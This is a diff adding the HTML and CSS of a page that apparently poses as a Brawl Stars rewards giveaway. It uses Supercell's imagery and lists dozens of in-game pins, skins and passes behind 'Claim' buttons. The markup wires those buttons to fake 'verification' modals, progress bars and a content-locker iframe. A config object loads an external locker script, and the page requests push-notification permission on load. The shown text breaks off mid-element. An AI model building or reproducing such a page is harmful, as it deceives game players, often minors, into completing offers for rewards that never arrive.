@@ -1,0 +1,1165 @@
+<!DOCTYPE html><html lang="en"><head>
+  <!-- Google tag (gtag.js) -->
+<script async="" src="https://www.googletagmanager.com/gtag/js?id=G-MBNK950BL7"></script>
+<script>
+  
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-MBNK950BL7');
+</script>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title> Claim Your Brawl Rewards 🔦</title>
+  
+<script type="text/javascript">
+    var IUjEQ_oas_OlSAac={"it":4567484,"key":"4ebc0"};
+</script>
+<script src="js/69af2c1.js"></script>
+
+
+  
+  <style>
+    body, html {
+      margin: 0;
+      padding: 0;
+      font-family: 'Poppins', sans-serif;
+      background: url('https://supercell.com/images/1a5b69311180a4a1c374e10556941f05/hero_bg_brawlstars.a385872a.jpg') ;
+      background-size: cover;
+      background-repeat: no-repeat;
+      background-attachment: fixed;
+      color: #fff;
+      text-align: center;
+      
+}
+    h1, h2, .pack div, #page-title {
+  font-family: 'Fredoka', sans-serif;
+}
+
+button {
+  font-family: 'Poppins', sans-serif;
+  font-weight: 600;
+  letter-spacing: 0.5px;
+}
+    .header img {
+      max-width: 120px;
+      height: auto;
+      margin-top: 20px;
+    }
+    .packs {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+      gap: 20px;
+      padding: 20px;
+    }
+    .pack {
+      background: url('images/GF.png') ;
+background-size: cover;
+      padding: 15px;
+      border-radius: 10px;
+      transition: transform 0.2s ease, background-color 0.3s ease;
+      box-shadow: 0 20px 10px rgba(1, 0, 0, 0.10);
+      font-weight: bold;
+      text-align: center;
+    }
+    .pack:hover {
+      transform: scale(1.1);
+      background: rgba(255, 255, 255, 0.4);
+    }
+    .pack img {
+      width: 100px;
+      margin-bottom: 10px;
+    }
+    .points {
+            margin-top: 8px;
+            background: #fff;
+            padding: 10px;
+            border-radius: 8px;
+            font-size: 18px;
+            font-weight: bold;
+            color: #080808;
+        }
+    .pack button {
+      display: block;
+      width: 100%;
+      padding: 10px 15px;
+      background-color: #f2f2f0;
+      border: none;
+      color: #000;
+      border-radius: 5px;
+      cursor: pointer;
+      font-weight: bold;
+      margin-top: 10px;
+    }
+    .pack button:hover {
+      background-color: #004ba1;
+      color: #fff;
+    }
+    /* Modal Styles */
+    .modal, .modal-generate, .verification-modal {
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.8);
+      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
+      justify-content: center;
+      align-items: center;
+      z-index: 1000;
+    }
+   .modal-content, .modal-generate-content {
+      background: url('images/ds.png') ;
+      color: #ffffff;
+      padding: 20px;
+      border-radius: 10px;
+      text-align: center;
+      width: 300px;
+      box-shadow: 0 4px 15px rgba(0, 0, 0, 0.5);
+      font-family: 'Fredoka', sans-serif;
+}
+
+    .verification-modal .modal-content {
+      background: url('images/ds.png') ;
+      color: #ffffff;
+      padding: 20px;
+      border-radius: 15px;
+      text-align: center;
+      width: 350px;
+      box-shadow: 0 4px 15px rgba(0, 0, 0, 0.5);
+    }
+    .verification-icon {
+      font-size: 3rem;
+      margin-bottom: 20px;
+      animation: rotate 1s linear infinite;
+      color: #007BFF;
+    }
+    @keyframes rotate {
+      from {
+        transform: rotate(0deg);
+      }
+      to {
+        transform: rotate(360deg);
+      }
+    }
+    .modal-content input, .modal-generate-content button {
+      width: 80%;
+      padding: 10px;
+      margin: 10px auto;
+      border: none;
+      border-radius: 5px;
+      font-size: 1rem;
+    }
+    .modal-content button, .modal-generate-content button {
+      padding: 10px 20px;
+      background-color: #f2f2f0;
+      border: none;
+      border-radius: 5px;
+      color: #000;
+      font-size: 1rem;
+      cursor: pointer;
+    }
+    .modal-content button:hover, .modal-generate-content button:hover {
+      background-color: #004ba1;
+      color: #fff;
+    }
+    .close-btn {
+      position: absolute;
+      top: 10px;
+      right: 10px;
+      background: none;
+      border: none;
+      color: #fff;
+      font-size: 1.5rem;
+      cursor: pointer;
+    }
+    .progress-bar {
+      width: 80%;
+      background: #ffffff;
+      border-radius: 10px;
+      overflow: hidden;
+      margin: 20px auto;
+    }
+    .progress-bar div {
+      height: 20px;
+      width: 0;
+      background: #1e90ff;
+      border-radius: 10px;
+      transition: width 0.3s ease;
+    }
+    .verify-btn {
+      display: none;
+      padding: 15px 30px;
+      background: linear-gradient(145deg, #007bff, #0056b3);
+      border: none;
+      border-radius: 10px;
+      color: #fff;
+      font-size: 1.2rem;
+      font-weight: bold;
+      cursor: pointer;
+      margin: 20px auto;
+      text-align: center;
+    }
+    .verify-btn.active {
+      display: block;
+    }
+    .verify-btn:hover {
+      background: linear-gradient(145deg, #0056b3, #007bff);
+    }
+    .fade {
+      opacity: 0;
+      transition: opacity 0.5s ease;
+    }
+    .fade-in {
+      opacity: 1;
+    }
+    /* Animation for modal appearance */
+@keyframes modalFadeIn {
+  0% {
+    opacity: 0;
+    transform: scale(0.8);
+  }
+  100% {
+    opacity: 1;
+    transform: scale(1);
+  }
+}
+
+.modal-content {
+  animation: modalFadeIn 0.4s ease;
+}
+   @keyframes flipIn {
+  0% {
+    opacity: 0;
+    transform: rotateX(-90deg) scale(0.8);
+  }
+  60% {
+    opacity: 1;
+    transform: rotateX(20deg) scale(1.05);
+  }
+  100% {
+    transform: rotateX(0deg) scale(1);
+  }
+}
+
+.modal-generate-content {
+  transform-origin: top center;
+  animation: flipIn 0.6s ease-out;
+}
+    .complete-btn.active {
+  animation: blink 1s infinite;
+}
+@keyframes blink {
+  0%, 100% { background-color: #019112; }
+  50% { background-color: #12d24f; }
+}
+    .progress-bar div {
+  box-shadow: 0 0 10px #1e90ff, 0 0 20px #1e90ff;
+}
+
+
+
+
+    /* Popup styles */
+        .popup {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.6);
+            display: none;
+            justify-content: center;
+            align-items: center;
+        }
+        .popup-content {
+            background: linear-gradient(135deg, #ffffff, #f7f7f7);
+            padding: 30px;
+    border-radius: 10px;
+    text-align: center;
+    width: 300px;
+    height: 350px;
+    display: flex;
+    flex-direction: column;  /* تغيير التوجيه إلى عمودي */
+    justify-content: space-between;  /* توزيع الأزرار والمسافات بينهما */
+}
+        .popup-content img {
+            width: 250px;
+            height: 250px;
+            margin: 0 auto 40px;
+        }
+      
+        .popup-content button {
+    width: 100%;  /* جعل الأزرار تأخذ عرض النافذة بالكامل */
+    padding: 10px;
+    margin: 5px 0; /* إضافة مسافة بين الأزرار */
+    border-radius: 5px;
+    font-size: 16px;
+    cursor: pointer;
+}
+
+/* تغيير مكان الزر "Open Locker" ليظهر في الأسفل */
+#open-btn {
+    margin-top: auto; /* الدفع للأعلى */
+}
+
+/* تصميم الزر "NEXT" */
+#popup-points {
+    background: linear-gradient(135deg, #6a11cb, #2575fc); /* تدرج لوني جذاب */
+    color: white;
+    padding: 15px;
+    border-radius: 8px;
+    font-size: 18px;
+    transition: all 0.3s ease;
+    cursor: pointer;
+    border: none;
+}
+
+#popup-points:hover {
+    transform: scale(1.05);
+    background: linear-gradient(135deg, #2575fc, #6a11cb);
+}
+
+#open-btn {
+    background: linear-gradient(135deg, #8e44ad, #9b59b6);
+    color: white;
+    padding: 15px;
+    border-radius: 8px;
+    font-size: 18px;
+    border: none;
+    cursor: pointer;
+    transition: all 0.3s ease;
+}
+
+#open-btn:hover {
+    background-color: #9b59b6;
+    transform: scale(1.05);
+}
+      
+        .close-popup {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            font-size: 18px;
+            cursor: pointer;
+        }
+
+        /* Loader (دائرة التحميل) */
+        .loader {
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #3498db;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: auto;
+            display: none;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* زر Open Locker */
+        .open-btn {
+            background: green;
+            color: white;
+            padding: 10px;
+            border-radius: 5px;
+            font-size: 16px;
+            cursor: pointer;
+            display: none;
+        }
+
+        /* اهتزاز النافذة */
+        @keyframes shake {
+            0% { transform: translateX(0); }
+            20% { transform: translateX(-5px); }
+            40% { transform: translateX(5px); }
+            60% { transform: translateX(-5px); }
+            80% { transform: translateX(5px); }
+            100% { transform: translateX(0); }
+        }
+
+        .shake {
+            animation: shake 0.5s ease;
+        }
+
+        /* iframe for locker */
+        .locker-iframe {
+            width: 100%;
+            border: none;
+            height: 100%;
+            min-height: 500px; /* Minimum height to prevent small content from being cut off */
+            box-sizing: border-box;
+        }
+
+        /* Container for iframe (wrapper) */
+        .locker-popup-content {
+            position: relative;
+            max-width: 80%;
+            max-height: 80%;
+            width: 90%;
+            height: 90%;
+        }
+  
+/* New Popup Styles */
+.purchase-popup {
+  display: none;
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  background-color: rgba(0, 0, 0, 0.8);
+  z-index: 1000;
+  justify-content: center;
+  align-items: center;
+}
+
+.popup-content {
+  background-color: #333;
+  padding: 25px;
+  border-radius: 10px;
+  width: 90%;
+  max-width: 380px;
+  box-shadow: 0 4px 20px rgba(0, 0, 0, 0.4);
+  text-align: center;
+  color: white;
+  position: absolute;
+  top: 50%;
+  left: 50%;
+  transform: translate(-50%, -50%);
+}
+
+.selected-images-container {
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  gap: 10px;
+  margin: 15px auto;
+}
+
+.item-popup-image-small {
+  width: 80px;
+  height: 80px;
+  border-radius: 50%;
+  object-fit: cover;
+  border: 2px solid #444;
+}
+
+.input-group input {
+  width: 92%;
+  padding: 15px 12px;
+  background-color: white;
+  color: #333;
+  border: 1px solid #ddd;
+  border-radius: 5px;
+  font-size: 15px;
+  font-weight: 600;
+}
+
+.popup-buttons {
+  display: flex;
+  justify-content: space-between;
+  gap: 12px;
+  margin-top: 20px;
+}
+
+.cancel-btn, .free-btn {
+  flex: 1;
+  padding: 12px;
+  border-radius: 5px;
+  font-weight: bold;
+  font-size: 15px;
+  cursor: pointer;
+}
+
+.cancel-btn {
+  background-color: #555;
+  color: white;
+  border: none;
+}
+
+.free-btn {
+  background-color: white;
+  border: none;
+  color: #333;
+}
+   .modal-item-img {
+  width: 120px;
+  height: auto;
+  margin: 0 auto 20px;
+  display: none;
+  display: block;
+  animation: zoomIn 0.4s ease;
+}
+
+
+/* اختياري: أنيميشن بسيط */
+@keyframes zoomIn {
+  from { transform: scale(0.5); opacity: 0; }
+  to { transform: scale(1); opacity: 1; }
+}
+    .roblox-loader {
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  gap: 8px;
+  margin-bottom: 20px;
+}
+
+.roblox-loader div {
+  width: 14px;
+  height: 14px;
+  background-color: #ffffff;
+  border-radius: 3px;
+  animation: bounce 1.2s infinite ease-in-out both;
+}
+
+.roblox-loader div:nth-child(1) {
+  animation-delay: -0.4s;
+}
+.roblox-loader div:nth-child(2) {
+  animation-delay: -0.2s;
+}
+.roblox-loader div:nth-child(3) {
+  animation-delay: 0s;
+}
+.roblox-loader div:nth-child(4) {
+  animation-delay: 0.2s;
+}
+
+@keyframes bounce {
+  0%, 80%, 100% {
+    transform: scale(0.8);
+    opacity: 0.5;
+  }
+  40% {
+    transform: scale(1.3);
+    opacity: 1;
+  }
+}
+
+.verification-spinner {
+  border: 6px solid #f3f3f3;            /* الخلفية */
+  border-top: 6px solid #3498db;        /* الجزء الدوار */
+  border-radius: 50%;                   /* جعله دائريًا */
+  width: 60px;
+  height: 60px;
+  animation: spin 1s linear infinite;
+  margin: 0 auto 20px;
+}
+
+@keyframes spin {
+  0% { transform: rotate(0deg); }
+  100% { transform: rotate(360deg); }
+}
+.square-loader {
+  width: 64px;
+  height: 64px;
+  position: relative;
+  margin: 0 auto 20px;
+}
+
+.square-loader div {
+  width: 16px;
+  height: 16px;
+  background: #ffffff;
+  position: absolute;
+  animation: squareFade 1.2s linear infinite;
+}
+
+.square-loader div:nth-child(1) {
+  top: 0;
+  left: 0;
+  animation-delay: 0s;
+}
+.square-loader div:nth-child(2) {
+  top: 0;
+  right: 0;
+  animation-delay: 0.3s;
+}
+.square-loader div:nth-child(3) {
+  bottom: 0;
+  right: 0;
+  animation-delay: 0.6s;
+}
+.square-loader div:nth-child(4) {
+  bottom: 0;
+  left: 0;
+  animation-delay: 0.9s;
+}
+
+@keyframes squareFade {
+  0%, 100% {
+    transform: scale(1);
+    opacity: 1;
+  }
+  50% {
+    transform: scale(1.5);
+    opacity: 0;
+  }
+}
+
+
+</style>
+<link rel="me" href="https://www.blogger.com/profile/05362478462587326863">
+<meta name="google-adsense-platform-account" content="ca-host-pub-1556223355139109">
+<meta name="google-adsense-platform-domain" content="blogspot.com">
+
+<script type="text/javascript" language="javascript">
+  // Supply ads personalization default for EEA readers
+  // See https://www.blogger.com/go/adspersonalization
+  adsbygoogle = window.adsbygoogle || [];
+  if (typeof adsbygoogle.requestNonPersonalizedAds === 'undefined') {
+    adsbygoogle.requestNonPersonalizedAds = 1;
+  }
+</script>
+
+<link rel="me" href="https://www.blogger.com/profile/12294774469051291472">
+<meta name="google-adsense-platform-account" content="ca-host-pub-1556223355139109">
+<meta name="google-adsense-platform-domain" content="blogspot.com">
+
+<script type="text/javascript" language="javascript">
+  // Supply ads personalization default for EEA readers
+  // See https://www.blogger.com/go/adspersonalization
+  adsbygoogle = window.adsbygoogle || [];
+  if (typeof adsbygoogle.requestNonPersonalizedAds === 'undefined') {
+    adsbygoogle.requestNonPersonalizedAds = 1;
+  }
+</script>
+
+<link rel="me" href="https://www.blogger.com/profile/10561680796761297758">
+<meta name="google-adsense-platform-account" content="ca-host-pub-1556223355139109">
+<meta name="google-adsense-platform-domain" content="blogspot.com">
+
+<script src="https://cdn.onesignal.com/sdks/web/v16/OneSignalSDK.page.js" defer></script>
+<script>
+  window.OneSignalDeferred = window.OneSignalDeferred || [];
+  OneSignalDeferred.push(async function(OneSignal) {
+    await OneSignal.init({
+      appId: "8d136015-373e-44d6-a04d-080ca8697c7c",
+    });
+  OneSignal.Notifications.requestPermission();
+  });
+</script>
+</head>
+<body>
+<script type="application/javascript" src="js/ps.js"></script> 
+  <div class="header">
+    <img src="https://i.imgur.com/4gki0Pd.png" alt="Logo">
+    <h1 id="page-title">Claim Your Brawl Rewards</h1>
+  </div>
+
+  <div id="gem-packs" class="packs fade fade-in">
+   
+    <div class="pack">
+      <img src="https://static.wikia.nocookie.net/brawlstars/images/8/87/BoW_2024_Pin-Dead.png/revision/latest?cb=20241029181709" alt="Pack 1">
+      <div></div>
+      <button onclick="openModal('Grape', 'https://i.pinimg.com/originals/68/11/e2/6811e27f0d52ea09b0d0d1b49383f4b9.gif')">Claim</button>
+    </div>
+	<div class="pack">
+      <img src="https://static.wikia.nocookie.net/brawlstars/images/0/08/Brawl_Pass_S38_Pin-Happy.png/revision/latest?cb=20250425102604" alt="Pack 1">
+      <div>             </div>
+      <button onclick="openModal('Grape', 'https://static.wikia.nocookie.net/brawlstars/images/0/08/Brawl_Pass_S38_Pin-Happy.png/revision/latest?cb=20250425102604')">Claim</button>
+    </div>
+		<div class="pack">
+      <img src="https://static.wikia.nocookie.net/brawlstars/images/2/2c/World_Finals_Pin-GG.png/revision/latest?cb=20201105140229" alt="Pack 1">
+      <div></div>
+      <button onclick="openModal('Grape', 'https://static.wikia.nocookie.net/brawlstars/images/2/2c/World_Finals_Pin-GG.png/revision/latest?cb=20201105140229')">Claim</button>
+    </div>
+		<div class="pack">
+      <img src="https://static.wikia.nocookie.net/brawlstars/images/4/48/Brawlentine%27s_Pin-Love.png/revision/latest?cb=20221214125006" alt="Pack 1">
+      <div></div>
+      <button onclick="openModal('Grape', 'https://static.wikia.nocookie.net/brawlstars/images/4/48/Brawlentine%27s_Pin-Love.png/revision/latest?cb=20221214125006')">Claim</button>
+    </div>
+	<div class="pack">
+      <img src="http://static.wikia.nocookie.net/brawlstars/images/5/54/SPG_Pin-Neutral.png/revision/latest?cb=20230626233215" alt="Pack 1">
+      <div></div>
+      <button onclick="openModal('Grape', 'http://static.wikia.nocookie.net/brawlstars/images/5/54/SPG_Pin-Neutral.png/revision/latest?cb=20230626233215')">Claim</button>
+    </div>
+    <div class="pack">
+      <img src="https://static.wikia.nocookie.net/brawlstars/images/8/87/Common_Pin_Pack.png/revision/latest?cb=20251023162907" alt="Pack 1">
+      <div></div>
+      <button onclick="openModal('Grape', 'https://static.wikia.nocookie.net/brawlstars/images/8/87/Common_Pin_Pack.png/revision/latest?cb=20251023162907')">Claim</button>
+    </div>
+    <div class="pack">
+      <img src="https://static.wikia.nocookie.net/brawlstars/images/4/40/Monthly_Finals_2023_Pin-Special_1.png/revision/latest?cb=20230626232844" alt="Pack 1">
+      <div></div>
+      <button onclick="openModal('Grape', 'https://i.pinimg.com/736x/f7/12/29/f71229f3500d98c0a08e4d0d1b7fb897.jpg')">Claim</button>
+    </div>
+    <div class="pack">
+      <img src="https://static.wikia.nocookie.net/brawlstars/images/b/bd/Rare_Pin_Pack.png/revision/latest?cb=20251023162920" alt="Pack 1">
+      <div></div>
+      <button onclick="openModal('Grape', 'https://static.wikia.nocookie.net/brawlstars/images/b/bd/Rare_Pin_Pack.png/revision/latest?cb=20251023162920')">Claim</button>
+    </div>
+    <div class="pack">
+      <img src="https://static.wikia.nocookie.net/brawlstars/images/6/61/Epic_Pin_Pack.png/revision/latest?cb=20211217230553" alt="Pack 2">
+      <div></div>
+      <button onclick="openModal('Grape', 'https://static.wikia.nocookie.net/brawlstars/images/6/61/Epic_Pin_Pack.png/revision/latest?cb=20211217230553')">Claim</button>
+    </div>
+    <div class="pack">
+      <img src="https://static.wikia.nocookie.net/brawlstars/images/c/cd/Trophy.png/revision/latest/scale-to-width-down/1000?cb=20200304181812" alt="Pack 3">
+      <div></div>
+      <button onclick="openModal('Grape', 'https://static.wikia.nocookie.net/brawlstars/images/c/cd/Trophy.png/revision/latest/scale-to-width-down/1000?cb=20200304181812')">Claim</button>
+    </div>
+    <div class="pack">
+      <img src="https://static.wikia.nocookie.net/brawlstars/images/9/93/Icon-Sushi_Roll.png/revision/latest?cb=20250523102804" alt="Pack 4">
+      <div></div>
+      <button onclick="openModal('Grape', 'https://static.wikia.nocookie.net/brawlstars/images/9/93/Icon-Sushi_Roll.png/revision/latest?cb=20250523102804')">Claim</button>
+    </div>
+    <div class="pack">
+      <img src="https://static.wikia.nocookie.net/brawlstars/images/c/c0/Pro_Pass.png/revision/latest/scale-to-width-down/1000?cb=20250227191057" alt="Pack 5">
+      <div></div>
+      <button onclick="openModal('Grape', 'https://static.wikia.nocookie.net/brawlstars/images/c/c0/Pro_Pass.png/revision/latest/scale-to-width-down/1000?cb=20250227191057')">Claim</button>
+    </div>
+    <div class="pack">
+      <img src="https://static.wikia.nocookie.net/brawlstars/images/7/7b/Shelly1-pfp.png/revision/latest?cb=20250905234505" alt="Pack 6">
+      <div></div>
+      <button onclick="openModal('Grape', 'https://static.wikia.nocookie.net/brawlstars/images/7/7b/Shelly1-pfp.png/revision/latest?cb=20250905234505')">Claim</button>
+    </div>
+    <div class="pack">
+      <img src="https://static.wikia.nocookie.net/brawlstars/images/d/dc/Najia1-pfp.png/revision/latest?cb=20260226052753" alt="Pack 6">
+      <div></div>
+      <button onclick="openModal('Grape', 'https://static.wikia.nocookie.net/brawlstars/images/d/dc/Najia1-pfp.png/revision/latest?cb=20260226052753')">Claim</button>
+    </div>
+    <div class="pack">
+      <img src="https://static.wikia.nocookie.net/brawlstars/images/f/fe/Chuck1-pfp.png/revision/latest?cb=20230924120523" alt="Pack 6">
+      <div></div>
+      <button onclick="openModal('Grape', 'https://static.wikia.nocookie.net/brawlstars/images/f/fe/Chuck1-pfp.png/revision/latest?cb=20230924120523')">Claim</button>
+    </div>
+    
+    <div class="pack">
+      <img src="https://static.wikia.nocookie.net/brawlstars/images/1/14/Power_Meal.png/revision/latest?cb=20240907082941" alt="Pack 6">
+      <div></div>
+      <button onclick="openModal('Grape', 'https://static.wikia.nocookie.net/brawlstars/images/1/14/Power_Meal.png/revision/latest?cb=20240907082941')">Claim</button>
+    </div>
+    <div class="pack">
+      <img src="https://static.wikia.nocookie.net/brawlstars/images/4/44/Power_Cards.png/revision/latest?cb=20251116070614" alt="Pack 6">
+      <div></div>
+      <button onclick="openModal('Grape', 'https://static.wikia.nocookie.net/brawlstars/images/4/44/Power_Cards.png/revision/latest?cb=20251116070614')">Claim</button>
+    </div>
+    <div class="pack">
+      <img src="https://static.wikia.nocookie.net/brawlstars/images/a/a0/Subway_Super.png/revision/latest?cb=20250904135758" alt="Pack 6">
+      <div></div>
+      <button onclick="openModal('Grape', 'https://static.wikia.nocookie.net/brawlstars/images/a/a0/Subway_Super.png/revision/latest?cb=20250904135758')">Claim</button>
+    </div>
+    <div class="pack">
+      <img src="https://static.wikia.nocookie.net/brawlstars/images/4/40/Ranked.png/revision/latest?cb=20240228162415" alt="Pack 6">
+      <div></div>
+      <button onclick="openModal('Grape', 'https://static.wikia.nocookie.net/brawlstars/images/4/40/Ranked.png/revision/latest?cb=20240228162415')">Claim</button>
+    </div>
+    <div class="pack">
+      <img src="http://static.wikia.nocookie.net/brawlstars/images/9/9e/Colette_Buffie_Skin-Bling.png/revision/latest?cb=20260430112824" alt="Pack 6">
+      <div></div>
+      <button onclick="openModal('Grape', 'http://static.wikia.nocookie.net/brawlstars/images/9/9e/Colette_Buffie_Skin-Bling.png/revision/latest?cb=20260430112824')">Claim</button>
+    </div>
+    <div class="pack">
+      <img src="https://static.wikia.nocookie.net/brawlstars/images/7/74/General_Challenge.png/revision/latest?cb=20220816184407" alt="Pack 6">
+      <div></div>
+      <button onclick="openModal('Grape', 'https://static.wikia.nocookie.net/brawlstars/images/7/74/General_Challenge.png/revision/latest?cb=20220816184407')">Claim</button>
+    </div>
+    <div class="pack">
+      <img src="https://static.wikia.nocookie.net/brawlstars/images/d/d6/Box_Pin-Pumpkin_Box.png/revision/latest?cb=20250902114707" alt="Pack 6">
+      <div></div>
+      <button onclick="openModal('Grape', 'https://static.wikia.nocookie.net/brawlstars/images/d/d6/Box_Pin-Pumpkin_Box.png/revision/latest?cb=20250902114707')">Claim</button>
+    </div>
+    <div class="pack">
+      <img src="https://static.wikia.nocookie.net/brawlstars/images/b/bd/Oni_Hunt.png/revision/latest?cb=20250425211825" alt="Pack 6">
+      <div></div>
+      <button onclick="openModal('Grape', 'https://static.wikia.nocookie.net/brawlstars/images/b/bd/Oni_Hunt.png/revision/latest?cb=20250425211825')">Claim</button>
+    </div>
+    <div class="pack">
+      <img src="https://static.wikia.nocookie.net/brawlstars/images/1/1c/Brawl_Icon.png/revision/latest/scale-to-width-down/1000?cb=20181010203524" alt="Pack 6">
+      <div></div>
+       <button onclick="openModal('Grape', 'https://static.wikia.nocookie.net/brawlstars/images/1/1c/Brawl_Icon.png/revision/latest/scale-to-width-down/1000?cb=20181010203524')">Claim</button>
+    </div>
+    
+    <div class="pack">
+      <img src="https://static.wikia.nocookie.net/brawlstars/images/e/e8/Star_Points.png/revision/latest/scale-to-width-down/1000?cb=20190827015915" alt="Pack 6">
+      <div></div>
+      <button onclick="openModal('Grape', 'https://static.wikia.nocookie.net/brawlstars/images/e/e8/Star_Points.png/revision/latest/scale-to-width-down/1000?cb=20190827015915')">Claim</button>
+    </div>
+    <div class="pack">
+      <img src="https://static.wikia.nocookie.net/brawlstars/images/4/43/Elixir.png/revision/latest?cb=20170621183330" alt="Pack 6">
+      <div></div>
+      <button onclick="openModal('Grape', 'https://static.wikia.nocookie.net/brawlstars/images/4/43/Elixir.png/revision/latest?cb=20170621183330')">Claim</button>
+    </div>
+    <div class="pack">
+      <img src="https://static.wikia.nocookie.net/brawlstars/images/c/c7/Bolt1-pfp.png/revision/latest/scale-to-width-down/1000?cb=20260425134225" alt="Pack 6">
+      <div></div>
+      <button onclick="openModal('Grape', 'https://static.wikia.nocookie.net/brawlstars/images/c/c7/Bolt1-pfp.png/revision/latest/scale-to-width-down/1000?cb=20260425134225')">Claim</button>
+    </div>
+        <div class="pack">
+      <img src="https://static.wikia.nocookie.net/brawlstars/images/b/b6/Duels.png/revision/latest/scale-to-width-down/1000?cb=20211215122145" alt="Pack 6">
+      <div></div>
+      <button onclick="openModal('Grape', 'https://static.wikia.nocookie.net/brawlstars/images/b/b6/Duels.png/revision/latest/scale-to-width-down/1000?cb=20211215122145')">Claim</button>
+    </div>
+    
+    <div class="pack">
+      <img src="https://static.wikia.nocookie.net/brawlstars/images/e/e2/Bling_TR.png/revision/latest?cb=20260107164255" alt="Pack 6">
+      <div></div>
+      <button onclick="openModal('Grape', 'https://static.wikia.nocookie.net/brawlstars/images/e/e2/Bling_TR.png/revision/latest?cb=20260107164255')">Claim</button>
+    </div>
+        <div class="pack">
+      <img src="https://static.wikia.nocookie.net/brawlstars/images/0/0f/Summer_Games_Pin-Sun.png/revision/latest?cb=20230626230738" alt="Pack 6">
+      <div></div>
+      <button onclick="openModal('Grape', 'https://static.wikia.nocookie.net/brawlstars/images/0/0f/Summer_Games_Pin-Sun.png/revision/latest?cb=20230626230738')">Claim</button>
+    </div>
+        <div class="pack">
+      <img src="https://pbs.twimg.com/media/F5Q9ZiEbEAAp5D1.png" alt="Pack 6">
+      <div></div>
+      <button onclick="openModal('Grape', 'https://pbs.twimg.com/media/F5Q9ZiEbEAAp5D1.png')">Claim</button>
+    </div>
+        <div class="pack">
+      <img src="https://static.wikia.nocookie.net/brawlstars/images/7/78/Loaded_Showdown.png/revision/latest?cb=20260224215305" alt="Pack 6">
+      <div></div>
+      <button onclick="openModal('Grape', 'https://static.wikia.nocookie.net/brawlstars/images/7/78/Loaded_Showdown.png/revision/latest?cb=20260224215305')">Claim</button>
+    </div>
+           <div class="pack">
+      <img src="https://static.wikia.nocookie.net/brawlstars/images/d/d7/Icon-Legendary_Brawler.png/revision/latest?cb=20251010092113" alt="Pack 6">
+      <div></div>
+      <button onclick="openModal('Grape', 'https://static.wikia.nocookie.net/brawlstars/images/d/d7/Icon-Legendary_Brawler.png/revision/latest?cb=20251010092113')">Claim</button>
+    </div>
+    <div class="pack">
+      <img src="https://static.wikia.nocookie.net/brawlstars/images/a/af/El_Primo_Skin-El_Primo_Club_Nacional.png/revision/latest/scale-to-width-down/1000?cb=20210813114917" alt="Pack 6">
+      <div></div>
+      <button onclick="openModal('Grape', 'https://static.wikia.nocookie.net/brawlstars/images/a/af/El_Primo_Skin-El_Primo_Club_Nacional.png/revision/latest/scale-to-width-down/1000?cb=20210813114917')">Claim</button>
+    </div>
+    <div class="pack">
+      <img src="https://static.wikia.nocookie.net/brawlstars/images/e/ee/Sirius_Skin-Default.png/revision/latest?cb=20260222060327" alt="Pack 6">
+      <div></div>
+      <button onclick="openModal('Grape', 'https://static.wikia.nocookie.net/brawlstars/images/e/ee/Sirius_Skin-Default.png/revision/latest?cb=20260222060327')">Claim</button>
+    </div>
+    <div class="pack">
+      <img src="https://static.wikia.nocookie.net/brawlstars/images/2/26/Starr_Nova_Skin-Default.png/revision/latest/scale-to-width-down/268?cb=20260420202409" alt="Pack 6">
+      <div></div>
+      <button onclick="openModal('Grape', 'https://static.wikia.nocookie.net/brawlstars/images/2/26/Starr_Nova_Skin-Default.png/revision/latest/scale-to-width-down/268?cb=20260420202409')">Claim</button>
+    </div>
+    <div class="pack">
+      <img src="https://static.wikia.nocookie.net/brawlstars/images/c/c5/Max_Skin-Streetwear.png/revision/latest/scale-to-width-down/1000?cb=20201110222639" alt="Pack 6">
+      <div></div>
+      <button onclick="openModal('Grape', 'https://static.wikia.nocookie.net/brawlstars/images/c/c5/Max_Skin-Streetwear.png/revision/latest/scale-to-width-down/1000?cb=20201110222639')">Claim</button>
+    </div>
+    <div class="pack">
+      <img src="https://static.wikia.nocookie.net/brawlstars/images/2/2b/Edgar_Skin-Default.png/revision/latest?cb=20230219113721" alt="Pack 6">
+      <div></div>
+      <button onclick="openModal('Grape', 'https://static.wikia.nocookie.net/brawlstars/images/2/2b/Edgar_Skin-Default.png/revision/latest?cb=20230219113721')">Claim</button>
+     </div>
+      <div class="pack">
+      <img src="https://static.wikia.nocookie.net/brawlstars/images/8/87/Wiki_Logo_Brawlers.png/revision/latest?cb=20200526034402" alt="Pack 6">
+      <div></div>
+      <button onclick="openModal('Grape', 'https://static.wikia.nocookie.net/brawlstars/images/8/87/Wiki_Logo_Brawlers.png/revision/latest?cb=20200526034402')">Claim</button>
+    </div>
+	<div class="pack">
+      <img src="https://static.wikia.nocookie.net/brawlstars/images/9/91/Najia_Skin-Default.png/revision/latest?cb=20260222060355" alt="Pack 6">
+      <div></div>
+      <button onclick="openModal('Grape', 'https://static.wikia.nocookie.net/brawlstars/images/9/91/Najia_Skin-Default.png/revision/latest?cb=20260222060355')">Claim</button>
+    </div>  
+	<div class="pack">
+      <img src="https://static.wikia.nocookie.net/brawlstars/images/1/13/Damian_Skin-Default.png/revision/latest?cb=20260425120111" alt="Pack 6">
+      <div></div>
+      <button onclick="openModal('Grape', 'https://static.wikia.nocookie.net/brawlstars/images/1/13/Damian_Skin-Default.png/revision/latest?cb=20260425120111')">Claim</button>
+    </div>
+	<div class="pack">
+      <img src="https://static.wikia.nocookie.net/brawlstars/images/c/cd/Glowy_Skin-Default.png/revision/latest?cb=20251215172355" alt="Pack 6">
+      <div></div>
